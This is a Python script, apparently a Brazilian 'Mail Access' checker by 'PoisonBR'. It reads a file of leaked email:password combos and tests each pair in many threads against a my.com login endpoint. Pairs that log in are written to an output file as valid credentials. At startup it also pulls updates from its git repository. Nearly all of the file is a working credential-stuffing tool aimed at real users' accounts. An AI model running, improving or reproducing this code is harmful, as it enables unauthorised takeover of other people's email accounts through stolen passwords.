import requests
import time
import subprocess
import threading
import sys
from requests.exceptions import ConnectionError

R='\033[1;31m'; B='\033[1;34m'; C='\033[1;37m'; Y='\033[1;33m'; G='\033[1;32m'; RT='\033[;0m'
EG=f'{C}[{G}!{C}]'; MG=f'{C}[{G}+{C}]'; MR=f'{C}[{R}-{C}]'; AG=f'{C}[{G}*{C}]'; IB=f'{C}[{B}i{C}]'; EB=f'{C}[{B}!{C}]'; EY=f'{C}[{Y}!{C}]'; IY=f'{C}[{Y}i{C}]'

print(f'{G}Checando por atualizacoes... {C}')

up = subprocess.run(["git", "pull"])

print(f'''{C}
                            /+osyhhhhhhyys++/
                         +oydddhhhhyyhhhhdddhy+/
                      /+yddhyyyys.josue.syyhddhs/
                     +hddyyssssssssssssssssssyyhdds/
                   /sddhyyyyyyssssssssssssssyyyyyhmh+
                  /hmdhhddddddhhhyyyyyyhhhhdddddhhhddo
                 /hmmdhs+/ //+osyhhhhhhysso+////ohddmdo
                /hmmmy{B}.           `````          `{C}smddd+
                smddm/{B}     `````          `````   {C}mdhmh/
               +ddydm+{B}  -/osyyyys+.    ./syyyyso/-{C}mdydms
               ymhyhmh{B}.yyo/ -- +hdo  /dho -- /oyh.{C}ymdyymd/
              /dmyyymd{B}.  ``.-   ./   -/.-   .``  `{C}dmhsydmo
              smdysymd{B}   shdhyydy      sdyyhddy   {C}dmyyshmy
              dmysshmy{B}                            {C}smhssymd/
             /dmyssymd{B}                            {C}hmhsyymm/
             /dmyssyhms{B}                          /{C}mdysyymm/
             /dmyssyydm/{B}  sh       hh/     -hy  .{C}dmyssyymm/
              dmhssssydd/{B} -hdhysshdysdhssyhdd  -{C}hmhyssyymd/
              ymhssssyyddo{B}``. //+/.` ./+// -` /{C}ddhysssyhmh
              +mdysssssyhdh{B} `     `/+`      -{C}sddysssssydmo
               ymhysssssyyddh/{B}`   `dm.   ` {C}sddhysssssyhmh/
               /hmhysssssyyyhdds{B} ..dm . {C}ohddhyyssssyyhmd+
                /yddhyssssssyyhhddhddddddhyyssssssyydmh+
               /+sdmmdhhyyyysssyyyyyyyyyysssyyyyyhddmdyo+/
           /+shdddhhyhhddddddhhhhhhhhhhhhhhdddddddhyyhhdddyo/
         /shddhyyysssssyyyyhhhhhhhhhhhhhhhhhhyyyyyssssyyyhdddy+
        /hmhyyssssssssssssssssssssssssssssssssssssssssssssyyhddo
        /dmhyyyyyssssssssssssssssssssssssssssssssssssssyyyyyydms
         +yhddddddhhhhhyyyyyyyyyyyyyyyyyyyyyyyyyyhhhhhdddddddhs/
           //++oossyyhhhhhhhdddddddddddddddddhhhhhhyyssoo++///
                       ///////+++++++++++++//////
     ██████╗  ██████╗ ██╗███████╗ ██████╗ ███╗   ██╗██████╗ ██████╗
     ██╔══██╗██╔═══██╗██║██╔════╝██╔═══██╗████╗  ██║██╔══██╗██╔══██╗
     ██████╔╝██║   ██║██║███████╗██║   ██║██╔██╗ ██║██████╔╝██████╔╝
     ██╔═══╝ ██║   ██║██║╚════██║██║   ██║██║╚██╗██║██╔══██╗██╔══██╗
     ██║     ╚██████╔╝██║███████║╚██████╔╝██║ ╚████║██████╔╝██║  ██║
     ╚═╝      ╚═════╝ ╚═╝╚══════╝ ╚═════╝ ╚═╝  ╚═══╝╚═════╝ ╚═╝  ╚═╝
     {RT}{B}*t.me/p0isonBR*{RT}'''); time.sleep(3)

os.system('clear')


print(f'''{G}*By PoisonBR                                                 
{B}███╗   ███╗ █████╗ ██╗██╗     {C} █████╗  ██████╗ ██████╗███████╗███████╗███████╗
{B}████╗ ████║██╔══██╗██║██║     {C}██╔══██╗██╔════╝██╔════╝██╔════╝██╔════╝██╔════╝
{B}██╔████╔██║███████║██║██║     {C}███████║██║     ██║     █████╗  ███████╗███████╗
{B}██║╚██╔╝██║██╔══██║██║██║{G}v1.1{C} ██╔══██║██║     ██║     ██╔══╝  ╚════██║╚════██║
{B}██║ ╚═╝ ██║██║  ██║██║███████╗{C}██║  ██║╚██████╗╚██████╗███████╗███████║███████║
{B}╚═╝     ╚═╝╚═╝  ╚═╝╚═╝╚══════╝{C}╚═╝  ╚═╝ ╚═════╝ ╚═════╝╚══════╝╚══════╝╚══════╝
{IY} Não funcional em grandes dominios (ex gmail), por fatores de segurança adicional.
''')

db=open(input(f'{MG} Indique o caminho do arquivo: {B}'), 'r').read().splitlines()
ldb=len(db)
print(f'{IB} {G}{str(len(db))}{C} e-mails no arquivo.\n')
txt=input(f'{MG} Defina o nome do novo arquivo de saida:{B} ')
open(txt, 'a+')
maxthreads=int(input(f'{MG} Digite o numero de threads:{B} '))
sema=threading.Semaphore(value=maxthreads)
threads=list()
for x in range(4):
	print(f'{AG} Testando credenciais, aguarde'+'.'*x)
	time.sleep(1)
	sys.stdout.write("\033[F")
	if x==3:
		print(f'{AG} Testando credenciais, aguarde'+'.'*x, '\n\n')

def checker(IB, B, MG, EG, G, C, email, senha, c, ldb, txt, v):
	sema.acquire()
	acesso=requests.get(f'https://aj-https.my.com/cgi-bin/auth?model=&simple=1&Login={email}&Password={senha}', headers={'User-Agent': 'MyCom/12436 CFNetwork/758.2.8 Darwin/15.0.0'}).text
	if ('Ok=1') in acesso:
		with open(txt, 'a+') as chk:
			chk.seek(0)
			line=chk.read(150)
			if len(line) > 0:
				chk.write("\n")
			chk.write(f'{email}:{senha}')
			chk.close()
	v=len(open(txt, 'r').read().splitlines())
	sys.stdout.write("\033[F")
	print(f'{IB} E-Mails verificados: {G}{str(c)}{C}, restantes: {G}{str(ldb-c)}{C}, credenciais válidas: {G}{str(v)}'+' '*10)
	if ldb-c==0:
		time.sleep(3)
		credits(IB, B, ldb, C, G, MG, txt, EG, v)
	sema.release()
	
def credits(IB, B, ldb, C, G, MG, txt, EG, v):
	v=len(open(txt, 'r').read().splitlines())
	creds=f'''\n{IB} Operação finalizada: {B}{str(ldb)}{C} e-mails verificados, {G}{str(v)}{C} credenciais válidas.
{MG} Credenciais salvas em: {B}{txt}                                                         

{EG} Me acompanhe no Github: {G}https://github.com/p0isonBR
{C}\n'''
	sys.stdout.write("\033[F\b\033[F")
	print(creds)
c=v=0

for combo in db:
	try:
		if ('|') in combo:
			combo=combo.replace('|', ':')
		email=combo.split(':')[0]
		senha=combo.split(':')[1]
		c+=1
		thread=threading.Thread(target=checker, args=(IB, B, MG, EG, G, C, email, senha, c, ldb, txt, v))
		threads.append(thread)
		thread.start()
	except(IndexError, RuntimeError, ConnectionError):
		continue
